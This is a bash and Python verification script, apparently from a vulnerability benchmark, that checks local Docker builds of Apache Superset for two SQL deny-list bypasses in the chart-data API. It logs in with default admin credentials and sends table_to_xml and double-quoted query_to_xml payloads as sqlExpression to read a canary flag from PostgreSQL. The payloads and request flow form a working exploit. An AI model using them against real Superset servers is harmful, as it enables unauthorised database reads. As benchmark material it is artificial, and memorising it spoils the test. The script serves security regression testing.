#!/usr/bin/env bash
# verify.sh --seed|--residual — PCBV2-0040 superset-cve-2026-23980 定制验证
# 0=效果发生(RUN_FLAG 出现在效果通道) 10=未发生 20=环境失败 30=参数错误
#
# case 机制（Apache Superset chart-data API 的 adhoc SQL deny-list 绕过, CVE-2025-48912 -> CVE-2026-23980）：
#   POST /api/v1/chart/data 的 sqlExpression 先过 DISALLOWED_SQL_FUNCTIONS deny list
#   （sqlparse token 检查）再交给 PostgreSQL 执行；canary flag 种在 postgres 的
#   canary 表（init-db.sh 由 start.sh 注入的 PCB_FLAG 写入），只能经 SQL 注入读出。
#   seed    = CVE-2025-48912: CAST(table_to_xml('canary',...) AS TEXT) —
#             v0(4.0.2) deny list 未覆盖 table_to_xml -> 生效；v1(4.1.2) 加入 deny list -> 阻断
#   residual= CVE-2026-23980: CAST("query_to_xml"('SELECT flag FROM canary LIMIT 1',...) AS TEXT) —
#             sqlparse 不识别双引号标识符 -> v1 仍绕过 deny list 生效；v2(6.0.0) sqlglot
#             规范化大写后 PG 找不到函数 -> 阻断
# 效果通道 = chart/data API 响应 body（canary flag 以 XML 文本回显）。
# flag 来源 = postgres canary 表（真 flag）：wrong/stale RUN_FLAG 重跑时响应仍含真 flag
#             ≠ override -> 匹配失败 -> 非 0（fresh-flag 通道）。
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
case "$VERSION" in v0|v1|v2) ;; *) echo "bad VERSION=$VERSION" >&2; exit 30 ;; esac
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"

if [[ -f "$WORK_DIR/compose.env" ]]; then
  set -a
  # shellcheck disable=SC1091
  source "$WORK_DIR/compose.env"
  set +a
fi
case "$VERSION" in
  v0) PORT="${PORT_SUPERSET_V0_0:-38400}";;
  v1) PORT="${PORT_SUPERSET_V1_0:-38410}";;
  v2) PORT="${PORT_SUPERSET_V2_0:-38420}";;
esac
_DYN="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" port "superset-$VERSION" 8088 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
[[ -n "$_DYN" ]] && PORT="$_DYN"
export PCB_TARGET_PORT="${PORT:-}"

# seed = CVE-2025-48912 字面量（与 poc/original_poc.py 同一 payload）
# residual = CVE-2026-23980 双引号标识符绕过（held-out 语义，内嵌实现，不引用 hidden 文件）
if [[ "$MODE" == "--seed" ]]; then
  PAYLOAD="CAST(table_to_xml('canary', true, false, '') AS TEXT)"
  PROBE_ID="cve-2025-48912-table-to-xml"
else
  PAYLOAD="CAST(\"query_to_xml\"('SELECT flag FROM canary LIMIT 1',true,false,'') AS TEXT)"
  PROBE_ID="cve-2026-23980-quoted-identifier-bypass"
fi

# 执行真实 case 逻辑：login -> ensure pcb_postgres database -> ensure public_data dataset
# -> POST chart/data（payload 作为 sqlExpression）。输出 {"status": http, "body": resp}。
OUT="$("$PY" - "$PORT" "$PAYLOAD" "$PROBE_ID" <<'PYEOF'
import sys, json, time
port, payload, probe_id = sys.argv[1], sys.argv[2], sys.argv[3]
import requests
BASE = "http://127.0.0.1:%s" % port
def fail(msg):
    print(json.dumps({"ok": False, "status": 0, "body": msg, "probe_id": probe_id}))
try:
    # superset 冷启动可能未就绪：login 重试（最多 8 次 × 30s）
    token = None
    for _ in range(8):
        try:
            r = requests.post(BASE + "/api/v1/security/login",
                              json={"username": "admin", "password": "admin123",
                                    "provider": "db", "refresh": True}, timeout=30)
            r.raise_for_status()
            token = r.json()["access_token"]
            break
        except Exception as e:
            if _ == 7:
                raise
            time.sleep(30)
except Exception as e:
    fail("login-fail: %s" % e)
    sys.exit(0)
hdrs = {"Authorization": "Bearer %s" % token, "Content-Type": "application/json"}
try:
    r = requests.get(BASE + "/api/v1/database/", headers=hdrs,
                     params={"q": json.dumps({"filters": [{"col": "database_name",
                             "opr": "eq", "value": "pcb_postgres"}]})}, timeout=30)
    if r.ok and r.json().get("result"):
        db_id = r.json()["result"][0]["id"]
    else:
        r = requests.post(BASE + "/api/v1/database/", headers=hdrs,
                          json={"database_name": "pcb_postgres",
                                "sqlalchemy_uri": "postgresql+psycopg2://superset:superset@db:5432/superset_data",
                                "expose_in_sqllab": True, "allow_dml": False}, timeout=30)
        r.raise_for_status()
        db_id = r.json()["id"]
    r = requests.get(BASE + "/api/v1/dataset/", headers=hdrs,
                     params={"q": json.dumps({"filters": [{"col": "table_name",
                             "opr": "eq", "value": "public_data"}]})}, timeout=30)
    if r.ok and r.json().get("result"):
        ds_id = r.json()["result"][0]["id"]
    else:
        r = requests.post(BASE + "/api/v1/dataset/", headers=hdrs,
                          json={"database": db_id, "table_name": "public_data",
                                "schema": "public"}, timeout=30)
        r.raise_for_status()
        ds_id = r.json()["id"]
    r = requests.post(BASE + "/api/v1/chart/data", headers=hdrs, timeout=90, json={
        "datasource": {"id": ds_id, "type": "table"},
        "force": False,
        "queries": [{
            "columns": [{"sqlExpression": payload, "label": "exfil",
                         "expressionType": "SQL", "hasCustomLabel": True}],
            "metrics": [], "filters": [], "row_limit": 1, "order_desc": True,
        }],
        "result_format": "json",
        "result_type": "results",
    })
    print(json.dumps({"ok": True, "status": r.status_code, "body": r.text,
                      "probe_id": probe_id}))
except Exception as e:
    fail("probe-fail: %s" % e)
PYEOF
)" || { echo "probe failed: $OUT" >&2; exit 20; }
{ printf '%s' "$OUT" > "$WORK_DIR/verify_result.json"; } 2>/dev/null || true

# 摘要（效果通道 body 可打印，flag 允许出现）
printf '%s' "$OUT" | "$PY" -c "import json,sys
try:
    d = json.load(sys.stdin)
    print('probe=%s http_status=%s body_len=%s' % (d.get('probe_id'), d.get('status'), len(d.get('body') or '')))
    print((d.get('body') or '')[:400])
except Exception as e:
    print('bad probe output: %s' % e)"

ST="$(printf '%s' "$OUT" | "$PY" -c "import json,sys
try: print(json.load(sys.stdin).get('status', 0))
except Exception: print(0)" 2>/dev/null || echo 0)"
if [[ -z "$ST" || "$ST" == "0" ]]; then echo "environment failure (probe error / service unreachable)" >&2; exit 20; fi

# flag 判定：RUN_FLAG 必须出现在效果通道（chart/data 响应 body）
if grep -qF "$RUN_FLAG" <<<"$OUT"; then
  echo "RESULT: effect observed (flag present in chart-data response)"
  exit 0
else
  echo "RESULT: effect blocked (flag absent from chart-data response)"
  exit 10
fi
